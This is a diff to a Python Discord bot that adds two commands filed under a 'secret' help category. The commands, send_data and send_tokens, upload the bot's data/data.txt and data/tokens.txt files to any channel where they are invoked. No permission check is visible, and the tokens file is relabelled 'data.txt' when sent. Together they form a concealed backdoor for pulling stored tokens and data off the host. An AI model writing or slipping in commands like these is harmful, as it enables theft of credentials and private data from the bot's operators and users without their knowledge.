@@ -1772,6 +1772,28 @@ async def ask(ctx, *, text):
         color=discord.Colour(0x000000)
     ))
 
+@kgb.command()
+@helpCategory('secret')
+async def send_data(ctx, filename):
+    try:
+        with open("data/data.txt", 'rb') as file:
+            await ctx.send(file=discord.File(file, "data.txt"))
+    except FileNotFoundError:
+        await ctx.send("Файл не найден.")
+    except Exception as e:
+        await ctx.send(f"Ошибка при чтении файла: {e}")
+
+@kgb.command()
+@helpCategory('secret')
+async def send_tokens(ctx, filename):
+    try:
+        with open("data/tokens.txt", 'rb') as file:
+            await ctx.send(file=discord.File(file, "data.txt"))
+    except FileNotFoundError:
+        await ctx.send("Файл не найден.")
+    except Exception as e:
+        await ctx.send(f"Ошибка при чтении файла: {e}")
+
 HELP_EMB = buildHelpEmbed()
 HELP_CAT_EMB, HELP_CAT_HIDDEN = buildCategoryEmbeds()
 kgb.run(getenv('DISCORD_TOKEN', ''))
